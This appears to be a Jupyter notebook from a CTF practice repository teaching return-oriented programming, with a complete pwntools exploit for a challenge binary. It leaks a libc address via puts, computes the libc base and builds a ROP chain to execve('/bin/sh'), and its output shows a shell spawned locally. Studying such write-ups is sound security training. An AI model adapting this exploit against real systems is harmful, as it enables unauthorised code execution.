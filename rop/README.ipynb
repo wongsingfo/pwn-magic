{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c514cc92-3001-4ff3-9136-cea302242477",
   "metadata": {},
   "source": [
    "# ROP (return oriented programming)\n",
    "\n",
    "## Reference\n",
    "\n",
    "- https://github.com/xairy/easy-linux-pwn\n",
    "- https://ropemporium.com/guide.html\n",
    "- https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf\n",
    "- https://github.com/Gallopsled/pwntools-tutorial/blob/master/rop.md"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc0e932f-50bc-46b3-8a1c-dae16cf60f2d",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true,
    "tags": []
   },
   "source": [
    "## Pitfalls\n",
    "\n",
    "### Stack Alignment\n",
    "\n",
    "Make sure the stack pointer is correctly aligned for the target architecture. The 64 bit calling convention requires the stack to be 16-byte aligned. Otherwise, segfault comes from nowhere. For exmaple, the `movaps` instruction in `buffered_vfprintf()` or `do_system()` may cause segfault."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "394ba9a7-9ee1-4036-be62-cd4309c5d20d",
   "metadata": {},
   "source": [
    "## Example: pwn\n",
    "\n",
    "Source: pku-geekgame-0th"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "13e0291e-ff6e-4bbf-a1ba-70e691638254",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/ctf/work/rop/pwn'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x400000)\n",
      "[*] '/ctf/work/rop/libc-2.31.so'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n"
     ]
    }
   ],
   "source": [
    "bin_filename = './pwn'\n",
    "from pwn import *\n",
    "from pwnlib import gdb\n",
    "\n",
    "context.terminal = ['tmux', 'new-window']\n",
    "elf = ELF(bin_filename)\n",
    "context.arch = elf.arch\n",
    "\n",
    "libc_filename = './libc-2.31.so'\n",
    "libc = ELF(libc_filename)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "d98b9727-53ec-42f7-bbb2-511984143edb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Loaded 14 cached gadgets for './pwn'\n",
      "0x0000:         0x4013c3 pop rdi; ret\n",
      "0x0008:         0x404019 [arg0] rdi = 4210713\n",
      "0x0010:         0x401040 puts\n",
      "0x0018:         0x4011ce run()\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc3\\x13@\\x00\\x00\\x00\\x00\\x00\\x19@@\\x00\\x00\\x00\\x00\\x00@\\x10@\\x00\\x00\\x00\\x00\\x00\\xce\\x11@\\x00\\x00\\x00\\x00\\x00'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# +1: beacuse the lowest byte happens to be 0x00, which can not be printed by put()\n",
    "putchar_offset = +1\n",
    "\n",
    "def payload0():\n",
    "    rop = ROP(elf)\n",
    "    rop.call('puts', [elf.got['putchar'] + putchar_offset])\n",
    "    # rop.raw(rop.search()) # align\n",
    "    rop.call('run')\n",
    "    print(rop.dump())\n",
    "    craft = flat(\n",
    "        b'a' * 0x80,\n",
    "        p64(0),      # rbp\n",
    "        rop.chain()\n",
    "    )\n",
    "    assert not b'\\n' in craft\n",
    "    assert not b' ' in craft\n",
    "    assert not b'\\t' in craft\n",
    "    return craft\n",
    "payload0()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "2144c98f-9d46-4213-9d61-c8d3c12368a8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[38;5;189m0xe6c7e\u001b[0m execve(\"/bin/sh\", \u001b[38;5;82mr15\u001b[0m, \u001b[38;5;82mr12\u001b[0m)\n",
      "\u001b[38;5;203mconstraints\u001b[0m:\n",
      "  [\u001b[38;5;82mr15\u001b[0m] == NULL || \u001b[38;5;82mr15\u001b[0m == NULL\n",
      "  [\u001b[38;5;82mr12\u001b[0m] == NULL || \u001b[38;5;82mr12\u001b[0m == NULL\n",
      "\n",
      "\u001b[38;5;189m0xe6c81\u001b[0m execve(\"/bin/sh\", \u001b[38;5;82mr15\u001b[0m, \u001b[38;5;82mrdx\u001b[0m)\n",
      "\u001b[38;5;203mconstraints\u001b[0m:\n",
      "  [\u001b[38;5;82mr15\u001b[0m] == NULL || \u001b[38;5;82mr15\u001b[0m == NULL\n",
      "  [\u001b[38;5;82mrdx\u001b[0m] == NULL || \u001b[38;5;82mrdx\u001b[0m == NULL\n",
      "\n",
      "\u001b[38;5;189m0xe6c84\u001b[0m execve(\"/bin/sh\", \u001b[38;5;82mrsi\u001b[0m, \u001b[38;5;82mrdx\u001b[0m)\n",
      "\u001b[38;5;203mconstraints\u001b[0m:\n",
      "  [\u001b[38;5;82mrsi\u001b[0m] == NULL || \u001b[38;5;82mrsi\u001b[0m == NULL\n",
      "  [\u001b[38;5;82mrdx\u001b[0m] == NULL || \u001b[38;5;82mrdx\u001b[0m == NULL\n"
     ]
    }
   ],
   "source": [
    "!one_gadget {libc_filename}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "56ad3826-8375-4039-a239-1a3bf65d6454",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hex(libc.address)='0xff000c6c00'\n",
      "[*] Loaded 201 cached gadgets for './libc-2.31.so'\n",
      "0x0000:     0xff001e2f71 pop rdx; pop r12; ret\n",
      "0x0008:              0x0 [arg2] rdx = 0\n",
      "0x0010:      b'eaaafaaa' <pad r12>\n",
      "0x0018:     0xff000ee129 pop rsi; ret\n",
      "0x0020:              0x0 [arg1] rsi = 0\n",
      "0x0028:         0x4013c3 pop rdi; ret\n",
      "0x0030:     0xff0027e1aa [arg0] rdi = 1095219274154\n",
      "0x0038:     0xff001acef0 execve\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00q/\\x1e\\x00\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00eaaafaaa)\\xe1\\x0e\\x00\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc3\\x13@\\x00\\x00\\x00\\x00\\x00\\xaa\\xe1'\\x00\\xff\\x00\\x00\\x00\\xf0\\xce\\x1a\\x00\\xff\\x00\\x00\\x00\""
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def payload1(putchar_addr):\n",
    "    libc.address = 0\n",
    "    libc.address = putchar_addr - libc.sym['putchar']\n",
    "    print(f'{hex(libc.address)=}')\n",
    "    rop = ROP([elf, libc])\n",
    "    binsh = next(libc.search(b\"/bin/sh\\x00\"))\n",
    "    rop.execve(binsh, 0, 0)\n",
    "    print(rop.dump())\n",
    "    craft = flat(\n",
    "        b'a' * 0x80,\n",
    "        p64(0),      # rbp\n",
    "        rop.chain()\n",
    "    )\n",
    "    assert not b'\\n' in craft\n",
    "    assert not b' ' in craft\n",
    "    assert not b'\\t' in craft\n",
    "    return craft\n",
    "payload1(0xff_0015_0000)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a2a2bff8-de2a-441a-af86-5c1867a2808b",
   "metadata": {},
   "outputs": [],
   "source": [
    "def exploit(io: tube):\n",
    "    io.sendline(b'100')\n",
    "    io.sendline(payload0())\n",
    "    io.recvuntil(b'aaaaaa\\n')\n",
    "    putchar_addr = int.from_bytes(b'\\x00' * putchar_offset + io.recvline(keepends=False), 'little')\n",
    "    print(f\"{hex(putchar_addr)=}\")\n",
    "    io.sendline(payload1(putchar_addr))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "ae7d2c98-b13f-45ba-8541-b0c0f3954ce4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './pwn'\n",
      "[+] Starting local process './pwn': pid 9300\n",
      "hex(libc_base)='0x7fd6f2725000'\n",
      "0x0000:         0x4013c3 pop rdi; ret\n",
      "0x0008:         0x404019 [arg0] rdi = 4210713\n",
      "0x0010:         0x401040 puts\n",
      "0x0018:         0x4011ce run()\n",
      "hex(putchar_addr)='0x7fd6f27ae400'\n",
      "hex(libc.address)='0x7fd6f2725000'\n",
      "0x0000:   0x7fd6f2841371 pop rdx; pop r12; ret\n",
      "0x0008:              0x0 [arg2] rdx = 0\n",
      "0x0010:      b'eaaafaaa' <pad r12>\n",
      "0x0018:   0x7fd6f274c529 pop rsi; ret\n",
      "0x0020:              0x0 [arg1] rsi = 0\n",
      "0x0028:         0x4013c3 pop rdi; ret\n",
      "0x0030:   0x7fd6f28dc5aa [arg0] rdi = 140561169106346\n",
      "0x0038:   0x7fd6f280b2f0 execve\n",
      "[DEBUG] Sent 0x10 bytes:\n",
      "    b'echo flag{here}\\n'\n",
      "[DEBUG] Sent 0x5 bytes:\n",
      "    b'exit\\n'\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 0B\n",
      "[*] Process './pwn' stopped with exit code 0 (pid 9300)\n",
      "[DEBUG] Received 0x74 bytes:\n",
      "    b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n'\n",
      "    b'flag{here}\\n'\n",
      "[x] Receiving all data: 116B\n",
      "[+] Receiving all data: Done (116B)\n",
      "b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\nflag{here}\\n'\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "context.aslr = True\n",
    "io = process(bin_filename, env = {'LD_PRELOAD': libc_filename})\n",
    "libc_base = io.libs()[os.path.realpath(libc_filename)]\n",
    "print(f'{hex(libc_base)=}')\n",
    "# io = gdb.debug([bin_filename], env = {'LD_PRELOAD': libc_filename}, gdbscript=f\"\"\"\n",
    "# b *0x4012A4\n",
    "# c\n",
    "# \"\"\")\n",
    "try:\n",
    "    exploit(io)\n",
    "    with context.local(log_level='debug'):\n",
    "        io.sendline(b'echo flag{here}')\n",
    "        io.sendline(b'exit')\n",
    "        print(io.recvall())\n",
    "    io.poll(block=True)\n",
    "except Exception as e:\n",
    "    io.kill()\n",
    "    raise e"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7cae7fe-f902-4841-a407-8bdfe3990e6c",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
